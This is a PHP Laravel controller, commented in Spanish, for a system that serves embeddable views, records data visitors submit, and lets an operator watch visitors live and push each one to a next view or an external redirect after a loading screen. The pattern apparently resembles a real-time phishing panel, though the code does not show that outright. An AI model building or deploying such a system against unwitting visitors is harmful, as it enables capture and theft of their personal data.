<?php

namespace App\Http\Controllers;

use App\Models\Company;
use App\Models\Project;
use App\Models\ProjectDomain;
use App\Services\Projects\ProjectBundleGenerator;
use App\Services\Projects\ProjectRenderer;
use App\Services\Projects\ViewIntegrator;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Str;

/**
 * Sirve al público las vistas de los proyectos publicados y recibe los datos
 * que capturan. La recepción reutiliza el mecanismo existente: cada envío
 * registra un cliente (Company), que aparece en el tablero en vivo del panel.
 */
class PublicSiteController extends Controller
{
    public function __construct(private ProjectRenderer $renderer) {}

    /** Sirve una vista por ruta (vista previa): /sitio/{proyecto}/{vista?} */
    public function serve(Project $project, ?string $viewSlug = null)
    {
        // Sin vista en la URL se sirve la principal (index) del proyecto.
        $view = $viewSlug
            ? $project->views()->where('slug', $viewSlug)->firstOrFail()
            : $project->indexView();
        abort_if($view === null, 404);

        return response($this->renderer->render($view))
            ->header('Content-Type', 'text/html; charset=utf-8');
    }

    /** Resuelve el host (subdominio) a su proyecto y sirve la vista principal. */
    public function serveByHost(Request $request, ?string $viewSlug = null)
    {
        $domain = ProjectDomain::where('host', strtolower($request->getHost()))->first();
        abort_if($domain === null, 404);

        return $this->serve($domain->project, $viewSlug);
    }

    /** ¿El host de la petición pertenece a un proyecto? (para '/' y fallback). */
    public static function hostIsProject(Request $request): bool
    {
        return ProjectDomain::where('host', strtolower($request->getHost()))->exists();
    }

    /** Recibe los datos capturados por integration.js. */
    public function submit(Request $request, string $projectSlug, string $viewSlug): JsonResponse
    {
        $project = Project::where('slug', $projectSlug)->first();
        $view = $project
            ? $project->views()->where('slug', $viewSlug)->first()
            : null;

        if (! $project || ! $view) {
            return response()->json(['ok' => false, 'message' => 'La vista no está disponible.'], 404);
        }

        $data = $request->validate([
            'view_target' => ['nullable', 'string', 'max:255'],
            'session' => ['nullable', 'uuid'],
            'data' => ['nullable', 'array'],
            'value' => ['nullable'],
        ]);

        // Modo "single": llega un único valor; modo "map": un objeto de campos.
        $payload = $data['data'] ?? [];
        if (($payload === [] || $payload === null) && array_key_exists('value', $data)) {
            $payload = ['value' => $data['value']];
        }

        if ($payload === [] || $payload === null) {
            return response()->json(['ok' => false, 'message' => 'No se recibió información.'], 422);
        }

        $meta = [
            '_proyecto' => $project->slug,
            '_vista' => $view->slug,
            '_target' => $data['view_target'] ?? null,
        ];

        // Continuidad de sesión: si llega un token conocido, los datos se suman al
        // MISMO cliente (no se crea otro), así no se confunde un navegador con otro.
        $company = ! empty($data['session'])
            ? Company::where('loading_token', $data['session'])->first()
            : null;

        if ($company) {
            $company->data = array_merge($company->data ?? [], $payload, $meta);
            if (blank($company->name) && $this->guessName($payload)) {
                $company->name = $this->guessName($payload);
            }
            $company->last_activity_at = now();
            // Al entregar un nuevo dato, se cierra la vista pendiente para que el
            // operador decida el siguiente paso.
            $company->forceFill(['next_view_id' => null, 'next_view_at' => null]);
            $company->save();
        } else {
            // Reutiliza el registro de clientes existente: el envío aparece en el tablero.
            $company = new Company([
                'empresa' => $project->name,
                'name' => $this->guessName($payload),
                'fecha' => now(),
                'data' => array_merge($payload, $meta),
            ]);
            $company->forceFill(['loading_token' => (string) Str::uuid()]);
            $company->last_activity_at = now();
            $company->save();
            $company->registro = 'REG-'.str_pad((string) $company->id, 4, '0', STR_PAD_LEFT);
            $company->save();
        }

        return response()->json([
            'ok' => true,
            'message' => 'Información recibida.',
            'loading_token' => $company->loading_token,
            // Si el proyecto tiene pantalla de carga, el cliente pasa a esperar allí.
            'loading_url' => $this->loadingUrl($project, $company->loading_token),
        ], 201);
    }

    /**
     * Presencia (heartbeat): el navegador del cliente avisa que tiene la página
     * abierta. Si no hay sesión aún, crea el cliente (visitante) y devuelve su token;
     * si ya existe, solo refresca su "visto por última vez" para marcarlo en línea.
     */
    public function presence(Request $request, string $projectSlug): JsonResponse
    {
        $project = Project::where('slug', $projectSlug)->first();
        abort_if($project === null, 404);

        $data = $request->validate(['session' => ['nullable', 'uuid']]);

        $company = ! empty($data['session'])
            ? Company::where('loading_token', $data['session'])->first()
            : null;

        if ($company) {
            // Actualización directa (sin eventos) para no invalidar cachés en cada latido.
            Company::whereKey($company->id)->update(['last_seen_at' => now()]);

            return response()->json(['ok' => true, 'session' => $company->loading_token])
                ->header('Cache-Control', 'no-store');
        }

        // Visitante nuevo: aparece en el tablero apenas abre la página.
        $company = new Company([
            'empresa' => $project->name,
            'fecha' => now(),
            'data' => ['_proyecto' => $project->slug, '_visitante' => true],
        ]);
        $company->forceFill([
            'loading_token' => (string) Str::uuid(),
            'last_activity_at' => now(),
            'last_seen_at' => now(),
        ])->save();
        $company->registro = 'REG-'.str_pad((string) $company->id, 4, '0', STR_PAD_LEFT);
        $company->save();

        return response()->json(['ok' => true, 'session' => $company->loading_token])
            ->header('Cache-Control', 'no-store');
    }

    /**
     * Sondeo por token de sesión del navegador (independiente del proyecto):
     * ¿el operador ya pidió la siguiente vista para ESTE usuario exacto?
     */
    public function nextBySession(string $session): JsonResponse
    {
        return $this->next('', $session);
    }

    /**
     * Sondeo de la pantalla de carga: ¿el operador ya pidió la siguiente vista?
     * Devuelve su URL (con la sesión) una sola vez y la marca como consumida.
     */
    public function next(string $projectSlug, string $session): JsonResponse
    {
        $company = Company::where('loading_token', $session)->first();

        if (! $company) {
            return response()->json(['url' => null])->header('Cache-Control', 'no-store');
        }

        // URL externa: el operador mandó al cliente a una dirección (botón con URL).
        if ($company->next_url) {
            $url = $company->next_url;
            $company->forceFill(['next_url' => null, 'next_view_at' => null])->save();

            // 'external' = true: el bundle redirige la página en vez de dibujar una vista.
            return response()->json(['url' => $url, 'view' => null, 'external' => true])
                ->header('Cache-Control', 'no-store');
        }

        if (! $company->next_view_id) {
            return response()->json(['url' => null])->header('Cache-Control', 'no-store');
        }

        $view = $company->nextView()->with('project')->first();
        if (! $view || ! $view->project) {
            return response()->json(['url' => null])->header('Cache-Control', 'no-store');
        }

        // Consumir: se entrega una sola vez para no reenviar en el siguiente sondeo.
        $company->forceFill(['next_view_id' => null, 'next_view_at' => null])->save();

        $url = ViewIntegrator::apiBase()."/sitio/{$view->project->slug}/{$view->slug}?s=".urlencode($session);

        // 'view' = slug para que el bundle index.js dibuje la vista sin recargar.
        return response()->json(['url' => $url, 'view' => $view->slug])->header('Cache-Control', 'no-store');
    }

    /** URL de la pantalla de carga del proyecto con la sesión, si existe. */
    private function loadingUrl(Project $project, ?string $session): ?string
    {
        $loading = $project->loadingView();
        if (! $loading || ! $session) {
            return null;
        }

        return ViewIntegrator::apiBase()."/sitio/{$project->slug}/{$loading->slug}?s=".urlencode($session);
    }

    /**
     * Sirve el integration.js de una vista como archivo público (para agregarlo con
     * <script src> en la página del cliente, alojada en otro dominio). CORS abierto.
     */
    public function embedJs(string $projectSlug, string $viewSlug)
    {
        $project = Project::where('slug', $projectSlug)->first();
        $view = $project ? $project->views()->where('slug', $viewSlug)->first() : null;

        abort_if($view === null, 404);

        return response((string) $view->integration_js, 200, [
            'Content-Type' => 'application/javascript; charset=utf-8',
            'Cache-Control' => 'public, max-age=300',
        ]);
    }

    /**
     * Sirve el ÚNICO index.js del proyecto: lleva dentro todas las vistas y las dibuja.
     * El cliente solo agrega <script src=".../embed/{proyecto}/index.js"> en su página.
     */
    public function projectBundle(string $projectSlug, ProjectBundleGenerator $bundle)
    {
        $project = Project::where('slug', $projectSlug)->with('views')->first();

        abort_if($project === null, 404);

        return response($bundle->generate($project), 200, [
            'Content-Type' => 'application/javascript; charset=utf-8',
            'Cache-Control' => 'no-store',
        ]);
    }

    /** Intenta un nombre legible a partir de campos típicos. */
    private function guessName(array $payload): ?string
    {
        foreach (['nombre', 'name', 'nombres', 'fullname', 'full_name'] as $key) {
            if (! empty($payload[$key]) && is_string($payload[$key])) {
                return Str::limit(trim($payload[$key]), 255, '');
            }
        }

        return null;
    }
}
